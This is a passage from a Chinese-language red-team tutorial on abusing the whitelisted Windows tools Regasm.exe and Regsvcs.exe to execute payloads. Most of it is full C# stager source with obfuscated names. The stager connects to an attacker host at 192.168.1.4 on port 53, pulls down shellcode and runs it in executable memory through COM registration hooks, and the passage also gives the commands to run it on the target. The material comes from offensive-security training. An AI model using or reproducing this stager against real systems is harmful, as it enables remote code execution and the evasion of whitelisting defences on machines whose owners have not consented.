<span class="token keyword">return</span> qaYyFq<span class="token punctuation">;</span><span class="token punctuation">}</span>

<span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">cmMtjerv</span><span class="token punctuation">(</span>byte<span class="token punctuation">[</span><span class="token punctuation">]</span> HEHUjJhkrNS<span class="token punctuation">)</span> <span class="token punctuation">{</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span>HEHUjJhkrNS <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>

UInt32 WcpKfU <span class="token operator">=</span> <span class="token function">VirtualAlloc</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>UInt32<span class="token punctuation">)</span>HEHUjJhkrNS<span class="token punctuation">.</span>Length<span class="token punctuation">,</span> <span class="token number">0x1000</span><span class="token punctuation">,</span> <span class="token number">0x40</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

Marshal<span class="token punctuation">.</span><span class="token function">Copy</span><span class="token punctuation">(</span>HEHUjJhkrNS<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>IntPtr<span class="token punctuation">)</span><span class="token punctuation">(</span>WcpKfU<span class="token punctuation">)</span><span class="token punctuation">,</span> HEHUjJhkrNS<span class="token punctuation">.</span>Length<span class="token punctuation">)</span><span class="token punctuation">;</span>

IntPtr UhxtIFnlOQatrk <span class="token operator">=</span> IntPtr<span class="token punctuation">.</span>Zero<span class="token punctuation">;</span>

UInt32 wdjYKFDCCf <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>

IntPtr XVYcQxpp <span class="token operator">=</span> IntPtr<span class="token punctuation">.</span>Zero<span class="token punctuation">;</span>

UhxtIFnlOQatrk <span class="token operator">=</span> <span class="token function">CreateThread</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> WcpKfU<span class="token punctuation">,</span> XVYcQxpp<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> ref wdjYKFDCCf<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token function">WaitForSingleObject</span><span class="token punctuation">(</span>UhxtIFnlOQatrk<span class="token punctuation">,</span> <span class="token number">0xFFFFFFFF</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token punctuation">}</span> 

public <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">LCIUtRN</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

byte<span class="token punctuation">[</span><span class="token punctuation">]</span> IBtCWU <span class="token operator">=</span> null<span class="token punctuation">;</span> IBtCWU <span class="token operator">=</span> <span class="token function">ErlgHH</span><span class="token punctuation">(</span><span class="token string">"192.168.1.4"</span><span class="token punctuation">,</span> <span class="token number">53</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token function">cmMtjerv</span><span class="token punctuation">(</span>IBtCWU<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token punctuation">}</span> <span class="token punctuation">}</span>
</code></pre>
<hr>
<h2><a id="113_Regasmexepayload_4227"></a>11.3 基于白名单Regasm.exe执行payload（三）</h2>
<p><strong>Regasm简介：</strong></p>
<p>Regasm 为程序集注册工具，读取程序集中的元数据，并将所需的项添加到注册表中。RegAsm.exe是Microsoft Corporation开发的合法文件进程。它与Microsoft.NET Assembly Registration Utility相关联。</p>
<p>说明：Regasm.exe所在路径没有被系统添加PATH环境变量中，因此，REGASM命令无法识别。</p>
<p><strong>具体参考微软官方文档：</strong></p>
<pre><code class="prism language-c">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>docs<span class="token punctuation">.</span>microsoft<span class="token punctuation">.</span>com<span class="token operator">/</span>en<span class="token operator">-</span>us<span class="token operator">/</span>dotnet<span class="token operator">/</span>framework<span class="token operator">/</span>tools<span class="token operator">/</span>regasm<span class="token operator">-</span>exe<span class="token operator">-</span>assembly<span class="token operator">-</span>registration<span class="token operator">-</span>tool
</code></pre>
<p><strong>基于白名单Regasm.exe配置payload：</strong></p>
<p>Windows 7 默认位置：</p>
<pre><code class="prism language-c">C<span class="token punctuation">:</span>\Windows\Microsoft<span class="token punctuation">.</span>NET\Framework\v4<span class="token punctuation">.</span><span class="token number">0.30319</span>\regasm<span class="token punctuation">.</span>exe
</code></pre>
<p>攻击机：192.168.1.4 Debian</p>
<p>靶机：192.168.1.3 Windows 7</p>
<p><strong>配置攻击机msf：</strong><br>
<img src="https://img-blog.csdnimg.cn/20201009225607584.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p><strong>靶机执行：</strong></p>
<pre><code class="prism language-c">C<span class="token punctuation">:</span>\Windows\Microsoft<span class="token punctuation">.</span>NET\Framework\v4<span class="token punctuation">.</span><span class="token number">0.30319</span>\regasm<span class="token punctuation">.</span>exe <span class="token operator">/</span>U Micropoor<span class="token punctuation">.</span>dll
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201009225626148.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<img src="https://img-blog.csdnimg.cn/20201009225632366.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p><strong>附录：Micropoor.cs</strong><br>
注：x86 payload</p>
<pre><code class="prism language-c">using System<span class="token punctuation">;</span> using System<span class="token punctuation">.</span>Net<span class="token punctuation">;</span> using System<span class="token punctuation">.</span>Linq<span class="token punctuation">;</span> using System<span class="token punctuation">.</span>Net<span class="token punctuation">.</span>Sockets<span class="token punctuation">;</span> using System<span class="token punctuation">.</span>Runtime<span class="token punctuation">.</span>InteropServices<span class="token punctuation">;</span> using System<span class="token punctuation">.</span>Threading<span class="token punctuation">;</span> using System<span class="token punctuation">.</span>EnterpriseServices<span class="token punctuation">;</span> using System<span class="token punctuation">.</span>Windows<span class="token punctuation">.</span>Forms<span class="token punctuation">;</span>

namespace HYlDKsYF

<span class="token punctuation">{</span>

public class kxKhdVzWQXolmmF <span class="token punctuation">:</span> ServicedComponent <span class="token punctuation">{</span> 

public <span class="token function">kxKhdVzWQXolmmF</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token string">"doge"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> 

<span class="token punctuation">[</span>ComRegisterFunction<span class="token punctuation">]</span>

public <span class="token keyword">static</span> <span class="token keyword">void</span> RegisterClass <span class="token punctuation">(</span> string pNNHrTZzW <span class="token punctuation">)</span>

<span class="token punctuation">{</span>

ZApOAKJKY<span class="token punctuation">.</span><span class="token function">QYJOTklTwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token punctuation">}</span> 

<span class="token punctuation">[</span>ComUnregisterFunction<span class="token punctuation">]</span>

public <span class="token keyword">static</span> <span class="token keyword">void</span> UnRegisterClass <span class="token punctuation">(</span> string pNNHrTZzW <span class="token punctuation">)</span>

<span class="token punctuation">{</span>

ZApOAKJKY<span class="token punctuation">.</span><span class="token function">QYJOTklTwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token punctuation">}</span>

<span class="token punctuation">}</span> 

public class ZApOAKJKY

<span class="token punctuation">{</span> <span class="token punctuation">[</span><span class="token function">DllImport</span><span class="token punctuation">(</span><span class="token string">"kernel32"</span><span class="token punctuation">)</span><span class="token punctuation">]</span> private <span class="token keyword">static</span> <span class="token keyword">extern</span> UInt32 <span class="token function">HeapCreate</span><span class="token punctuation">(</span>UInt32 FJyyNB<span class="token punctuation">,</span> UInt32 fwtsYaiizj<span class="token punctuation">,</span> UInt32 dHJhaXQiaqW<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token punctuation">[</span><span class="token function">DllImport</span><span class="token punctuation">(</span><span class="token string">"kernel32"</span><span class="token punctuation">)</span><span class="token punctuation">]</span> private <span class="token keyword">static</span> <span class="token keyword">extern</span> UInt32 <span class="token function">HeapAlloc</span><span class="token punctuation">(</span>UInt32 bqtaDNfVCzVox<span class="token punctuation">,</span> UInt32 hjDFdZuT<span class="token punctuation">,</span> UInt32 JAVAYBFdojxsgo<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token punctuation">[</span><span class="token function">DllImport</span><span class="token punctuation">(</span><span class="token string">"kernel32"</span><span class="token punctuation">)</span><span class="token punctuation">]</span> private <span class="token keyword">static</span> <span class="token keyword">extern</span> UInt32 <span class="token function">RtlMoveMemory</span><span class="token punctuation">(</span>UInt32 AQdEyOhn<span class="token punctuation">,</span> byte<span class="token punctuation">[</span><span class="token punctuation">]</span> wknmfaRmoElGo<span class="token punctuation">,</span> UInt32 yRXPRezIkcorSOo<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token punctuation">[</span><span class="token function">DllImport</span><span class="token punctuation">(</span><span class="token string">"kernel32"</span><span class="token punctuation">)</span><span class="token punctuation">]</span> private <span class="token keyword">static</span> <span class="token keyword">extern</span> IntPtr <span class="token function">CreateThread</span><span class="token punctuation">(</span>UInt32 uQgiOlrrBaR<span class="token punctuation">,</span> UInt32 BxkWKqEKnp<span class="token punctuation">,</span> UInt32 lelfRubuprxr<span class="token punctuation">,</span> IntPtr qPzVKjdiF<span class="token punctuation">,</span> UInt32 kNXJcS<span class="token punctuation">,</span> ref UInt32 atiLJcRPnhfyGvp<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token punctuation">[</span><span class="token function">DllImport</span><span class="token punctuation">(</span><span class="token string">"kernel32"</span><span class="token punctuation">)</span><span class="token punctuation">]</span> private <span class="token keyword">static</span> <span class="token keyword">extern</span> UInt32 <span class="token function">WaitForSingleObject</span><span class="token punctuation">(</span>IntPtr XSjyzoKzGmuIOcD<span class="token punctuation">,</span> UInt32 VumUGj<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">static</span> byte<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">HMSjEXjuIzkkmo</span><span class="token punctuation">(</span>string aCWWUttzmy<span class="token punctuation">,</span> <span class="token keyword">int</span> iJGvqiEDGLhjr<span class="token punctuation">)</span> <span class="token punctuation">{</span>

IPEndPoint YUXVAnzAurxH <span class="token operator">=</span> new <span class="token function">IPEndPoint</span><span class="token punctuation">(</span>IPAddress<span class="token punctuation">.</span><span class="token function">Parse</span><span class="token punctuation">(</span>aCWWUttzmy<span class="token punctuation">)</span><span class="token punctuation">,</span> iJGvqiEDGLhjr<span class="token punctuation">)</span><span class="token punctuation">;</span>

Socket MXCEuiuRIWgOYze <span class="token operator">=</span> new <span class="token function">Socket</span><span class="token punctuation">(</span>AddressFamily<span class="token punctuation">.</span>InterNetwork<span class="token punctuation">,</span> SocketType<span class="token punctuation">.</span>Stream<span class="token punctuation">,</span> ProtocolType<span class="token punctuation">.</span>Tcp<span class="token punctuation">)</span><span class="token punctuation">;</span>

try <span class="token punctuation">{</span> MXCEuiuRIWgOYze<span class="token punctuation">.</span><span class="token function">Connect</span><span class="token punctuation">(</span>YUXVAnzAurxH<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>

catch <span class="token punctuation">{</span> <span class="token keyword">return</span> null<span class="token punctuation">;</span><span class="token punctuation">}</span>

byte<span class="token punctuation">[</span><span class="token punctuation">]</span> Bjpvhc <span class="token operator">=</span> new byte<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

MXCEuiuRIWgOYze<span class="token punctuation">.</span><span class="token function">Receive</span><span class="token punctuation">(</span>Bjpvhc<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">int</span> IETFBI <span class="token operator">=</span> BitConverter<span class="token punctuation">.</span><span class="token function">ToInt32</span><span class="token punctuation">(</span>Bjpvhc<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

byte<span class="token punctuation">[</span><span class="token punctuation">]</span> ZKSAAFwxgSDnTW <span class="token operator">=</span> new byte<span class="token punctuation">[</span>IETFBI <span class="token operator">+</span> <span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token keyword">int</span> JFPJLlk <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>

<span class="token keyword">while</span> <span class="token punctuation">(</span>JFPJLlk <span class="token operator">&lt;</span> IETFBI<span class="token punctuation">)</span>

<span class="token punctuation">{</span> JFPJLlk <span class="token operator">+</span><span class="token operator">=</span> MXCEuiuRIWgOYze<span class="token punctuation">.</span><span class="token function">Receive</span><span class="token punctuation">(</span>ZKSAAFwxgSDnTW<span class="token punctuation">,</span> JFPJLlk <span class="token operator">+</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>IETFBI ‐ JFPJLlk<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">4096</span> <span class="token operator">?</span> <span class="token punctuation">(</span>IETFBI ‐ JFPJLlk<span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token number">4096</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>

byte<span class="token punctuation">[</span><span class="token punctuation">]</span> nXRztzNVwPavq <span class="token operator">=</span> BitConverter<span class="token punctuation">.</span><span class="token function">GetBytes</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>MXCEuiuRIWgOYze<span class="token punctuation">.</span>Handle<span class="token punctuation">)</span><span class="token punctuation">;</span>

Array<span class="token punctuation">.</span><span class="token function">Copy</span><span class="token punctuation">(</span>nXRztzNVwPavq<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> ZKSAAFwxgSDnTW<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span> ZKSAAFwxgSDnTW<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xBF</span><span class="token punctuation">;</span>

<span class="token keyword">return</span> ZKSAAFwxgSDnTW<span class="token punctuation">;</span><span class="token punctuation">}</span>

<span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">TOdKEwPYRUgJly</span><span class="token punctuation">(</span>byte<span class="token punctuation">[</span><span class="token punctuation">]</span> KNCtlJWAmlqJ<span class="token punctuation">)</span> <span class="token punctuation">{</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span>KNCtlJWAmlqJ <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>

UInt32 uuKxFZFwog <span class="token operator">=</span> <span class="token function">HeapCreate</span><span class="token punctuation">(</span><span class="token number">0x00040000</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>UInt32<span class="token punctuation">)</span>KNCtlJWAmlqJ<span class="token punctuation">.</span>Lengt h<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

UInt32 sDPjIMhJIOAlwn <span class="token operator">=</span> <span class="token function">HeapAlloc</span><span class="token punctuation">(</span>uuKxFZFwog<span class="token punctuation">,</span> <span class="token number">0x00000008</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>UInt32<span class="token punctuation">)</span>KNCtlJWAmlqJ<span class="token punctuation">.</span>Length<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token function">RtlMoveMemory</span><span class="token punctuation">(</span>sDPjIMhJIOAlwn<span class="token punctuation">,</span> KNCtlJWAmlqJ<span class="token punctuation">,</span> <span class="token punctuation">(</span>UInt32<span class="token punctuation">)</span>KNCtlJWAmlqJ<span class="token punctuation">.</span>Length<span class="token punctuation">)</span><span class="token punctuation">;</span>

UInt32 ijifOEfllRl <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>

IntPtr ihXuoEirmz <span class="token operator">=</span> <span class="token function">CreateThread</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> sDPjIMhJIOAlwn<span class="token punctuation">,</span> IntPtr<span class="token punctuation">.</span>Zero<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> ref ijifOEfllRl<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token function">WaitForSingleObject</span><span class="token punctuation">(</span>ihXuoEirmz<span class="token punctuation">,</span> <span class="token number">0xFFFFFFFF</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span> 

public <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">QYJOTklTwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

byte<span class="token punctuation">[</span><span class="token punctuation">]</span> ZKSAAFwxgSDnTW <span class="token operator">=</span> null<span class="token punctuation">;</span> ZKSAAFwxgSDnTW <span class="token operator">=</span> <span class="token function">HMSjEXjuIzkkmo</span><span class="token punctuation">(</span><span class="token string">"192.168.1.4"</span><span class="token punctuation">,</span> <span class="token number">53</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token function">TOdKEwPYRUgJly</span><span class="token punctuation">(</span>ZKSAAFwxgSDnTW<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token punctuation">}</span> <span class="token punctuation">}</span> <span class="token punctuation">}</span>
</code></pre>
<hr>
<h2><a id="114_Regsvcsexepayload_4366"></a>11.4 基于白名单Regsvcs.exe执行payload（四）</h2>
<p><strong>Regsvcs简介：</strong></p>
<p>Regsvcs为.NET服务安装工具，主要提供三类服务：</p>
<pre><code class="prism language-c">加载并注册程序集。
  
生成、注册类型库并将其安装到指定的 COM<span class="token operator">+</span> <span class="token number">1.0</span> 应用程序中。  

配置以编程方式添加到类的服务。  
</code></pre>
<p>说明：Regsvcs.exe所在路径没有被系统添加PATH环境变量中，因此，Regsvcs命令无法识别。</p>
<p><strong>具体参考微软官方文档：</strong></p>
<pre><code class="prism language-c">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>docs<span class="token punctuation">.</span>microsoft<span class="token punctuation">.</span>com<span class="token operator">/</span>en<span class="token operator">-</span>us<span class="token operator">/</span>dotnet<span class="token operator">/</span>framework<span class="token operator">/</span>tools<span class="token operator">/</span>regsvcs<span class="token operator">-</span>exe<span class="token operator">-</span>net<span class="token operator">-</span>services<span class="token operator">-</span>installation<span class="token operator">-</span>tool
</code></pre>
<p><strong>基于白名单Regsvcs.exe配置payload：</strong></p>
<p>Windows 7 默认位置：</p>
<pre><code class="prism language-c">C<span class="token punctuation">:</span>\Windows\Microsoft<span class="token punctuation">.</span>NET\Framework\v4<span class="token punctuation">.</span><span class="token number">0.30319</span>\regsvcs<span class="token punctuation">.</span>exe
</code></pre>
<p>攻击机：192.168.1.4 Debian</p>
<p>靶机：192.168.1.3 Windows 7<br>
配置攻击机msf：<br>
<img src="https://img-blog.csdnimg.cn/20201009225817242.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p><strong>靶机执行：</strong></p>
<pre><code class="prism language-c">C<span class="token punctuation">:</span>\Windows\Microsoft<span class="token punctuation">.</span>NET\Framework\v4<span class="token punctuation">.</span><span class="token number">0.30319</span>\regsvcs<span class="token punctuation">.</span>exe Micropoor<span class="token punctuation">.</span>dll
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201009225828215.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<img src="https://img-blog.csdnimg.cn/20201009225833377.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p>附录：Micropoor.cs<br>
注：x86 payload</p>
<pre><code class="prism language-c">using System<span class="token punctuation">;</span> using System<span class="token punctuation">.</span>Net<span class="token punctuation">;</span> using System<span class="token punctuation">.</span>Linq<span class="token punctuation">;</span> using System<span class="token punctuation">.</span>Net<span class="token punctuation">.</span>Sockets<span class="token punctuation">;</span> using System<span class="token punctuation">.</span>Runtime<span class="token punctuation">.</span>InteropServices<span class="token punctuation">;</span> using System<span class="token punctuation">.</span>Threading<span class="token punctuation">;</span> using System<span class="token punctuation">.</span>EnterpriseServices<span class="token punctuation">;</span> using System<span class="token punctuation">.</span>Windows<span class="token punctuation">.</span>Forms<span class="token punctuation">;</span>

namespace phwUqeuTRSqn

<span class="token punctuation">{</span>

public class mfBxqerbXgh <span class="token punctuation">:</span> ServicedComponent <span class="token punctuation">{</span> 

public <span class="token function">mfBxqerbXgh</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token string">"Micropoor"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> 

<span class="token punctuation">[</span>ComRegisterFunction<span class="token punctuation">]</span>

public <span class="token keyword">static</span> <span class="token keyword">void</span> RegisterClass <span class="token punctuation">(</span> string DssjWsFMnwwXL <span class="token punctuation">)</span>

<span class="token punctuation">{</span>

uXsiCEXRzLNkI<span class="token punctuation">.</span><span class="token function">BBNSohgZXGCaD</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token punctuation">}</span> 

<span class="token punctuation">[</span>ComUnregisterFunction<span class="token punctuation">]</span>

public <span class="token keyword">static</span> <span class="token keyword">void</span> UnRegisterClass <span class="token punctuation">(</span> string DssjWsFMnwwXL <span class="token punctuation">)</span>

<span class="token punctuation">{</span>

 uXsiCEXRzLNkI<span class="token punctuation">.</span><span class="token function">BBNSohgZXGCaD</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token punctuation">}</span>

<span class="token punctuation">}</span> 

public class uXsiCEXRzLNkI

<span class="token punctuation">{</span> <span class="token punctuation">[</span><span class="token function">DllImport</span><span class="token punctuation">(</span><span class="token string">"kernel32"</span><span class="token punctuation">)</span><span class="token punctuation">]</span> private <span class="token keyword">static</span> <span class="token keyword">extern</span> UInt32 <span class="token function">HeapCreate</span><span class="token punctuation">(</span>UInt32 pAyHWx<span class="token punctuation">,</span> UInt32 KXNJUcPIUymFNbJ<span class="token punctuation">,</span> UInt32 MotkftcMAIJRnW<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token punctuation">[</span><span class="token function">DllImport</span><span class="token punctuation">(</span><span class="token string">"kernel32"</span><span class="token punctuation">)</span><span class="token punctuation">]</span> private <span class="token keyword">static</span> <span class="token keyword">extern</span> UInt32 <span class="token function">HeapAlloc</span><span class="token punctuation">(</span>UInt32 yjmmncJHBrUu<span class="token punctuation">,</span> UInt32 MYjktCDxYrlTs<span class="token punctuation">,</span> UInt32 zyBAwQVBQbi<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token punctuation">[</span><span class="token function">DllImport</span><span class="token punctuation">(</span><span class="token string">"kernel32"</span><span class="token punctuation">)</span><span class="token punctuation">]</span> private <span class="token keyword">static</span> <span class="token keyword">extern</span> UInt32 <span class="token function">RtlMoveMemory</span><span class="token punctuation">(</span>UInt32 PorEiXBhZkA<span class="token punctuation">,</span> byte<span class="token punctuation">[</span><span class="token punctuation">]</span> UIkcqF<span class="token punctuation">,</span> UInt32 wAXQEPCIVJQQb<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token punctuation">[</span><span class="token function">DllImport</span><span class="token punctuation">(</span><span class="token string">"kernel32"</span><span class="token punctuation">)</span><span class="token punctuation">]</span> private <span class="token keyword">static</span> <span class="token keyword">extern</span> IntPtr <span class="token function">CreateThread</span><span class="token punctuation">(</span>UInt32 WNvQyYv<span class="token punctuation">,</span> UInt32 vePRog<span class="token punctuation">,</span> UInt32 Bwxjth<span class="token punctuation">,</span> IntPtr ExkSdsTdwD<span class="token punctuation">,</span> UInt32 KfNaMFOJVTSxbrR<span class="token punctuation">,</span> ref UInt32 QEuyYka<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token punctuation">[</span><span class="token function">DllImport</span><span class="token punctuation">(</span><span class="token string">"kernel32"</span><span class="token punctuation">)</span><span class="token punctuation">]</span> private <span class="token keyword">static</span> <span class="token keyword">extern</span> UInt32 <span class="token function">WaitForSingleObject</span><span class="token punctuation">(</span>IntPtr pzymHg<span class="token punctuation">,</span> UInt32 lReJrqjtOqvkXk<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">static</span> byte<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">SVMBrK</span><span class="token punctuation">(</span>string MKwSjIxqTxxEO<span class="token punctuation">,</span> <span class="token keyword">int</span> jVaXWRxcmw<span class="token punctuation">)</span> <span class="token punctuation">{</span>

IPEndPoint hqbNYMZQr <span class="token operator">=</span> new <span class="token function">IPEndPoint</span><span class="token punctuation">(</span>IPAddress<span class="token punctuation">.</span><span class="token function">Parse</span><span class="token punctuation">(</span>MKwSjIxqTxxEO<span class="token punctuation">)</span><span class="token punctuation">,</span> jVaXWRxcmw<span class="token punctuation">)</span><span class="token punctuation">;</span>

Socket LbLgipot <span class="token operator">=</span> new <span class="token function">Socket</span><span class="token punctuation">(</span>AddressFamily<span class="token punctuation">.</span>InterNetwork<span class="token punctuation">,</span> SocketType<span class="token punctuation">.</span>Stream<span class="token punctuation">,</span> ProtocolType<span class="token punctuation">.</span>Tcp<span class="token punctuation">)</span><span class="token punctuation">;</span>

try <span class="token punctuation">{</span> LbLgipot<span class="token punctuation">.</span><span class="token function">Connect</span><span class="token punctuation">(</span>hqbNYMZQr<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>

catch <span class="token punctuation">{</span> <span class="token keyword">return</span> null<span class="token punctuation">;</span><span class="token punctuation">}</span>

byte<span class="token punctuation">[</span><span class="token punctuation">]</span> VKQsLPgLmVdp <span class="token operator">=</span> new byte<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

LbLgipot<span class="token punctuation">.</span><span class="token function">Receive</span><span class="token punctuation">(</span>VKQsLPgLmVdp<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">int</span> jbQtneZFbvzK <span class="token operator">=</span> BitConverter<span class="token punctuation">.</span><span class="token function">ToInt32</span><span class="token punctuation">(</span>VKQsLPgLmVdp<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

byte<span class="token punctuation">[</span><span class="token punctuation">]</span> cyDiPLJhiAQbw <span class="token operator">=</span> new byte<span class="token punctuation">[</span>jbQtneZFbvzK <span class="token operator">+</span> <span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token keyword">int</span> vyPloXEDJoylLbj <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>

<span class="token keyword">while</span> <span class="token punctuation">(</span>vyPloXEDJoylLbj <span class="token operator">&lt;</span> jbQtneZFbvzK<span class="token punctuation">)</span>

 <span class="token punctuation">{</span> vyPloXEDJoylLbj <span class="token operator">+</span><span class="token operator">=</span> LbLgipot<span class="token punctuation">.</span><span class="token function">Receive</span><span class="token punctuation">(</span>cyDiPLJhiAQbw<span class="token punctuation">,</span> vyPloXEDJoylLbj <span class="token operator">+</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>jbQtneZFbvzK ‐ vyPloXEDJoylLbj<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">4096</span> <span class="token operator">?</span> <span class="token punctuation">(</span>jbQtneZFbvzK ‐ vyPloXEDJoylLbj<span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token number">4096</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>

byte<span class="token punctuation">[</span><span class="token punctuation">]</span> MkHUcy <span class="token operator">=</span> BitConverter<span class="token punctuation">.</span><span class="token function">GetBytes</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>LbLgipot<span class="token punctuation">.</span>Handle<span class="token punctuation">)</span><span class="token punctuation">;</span>

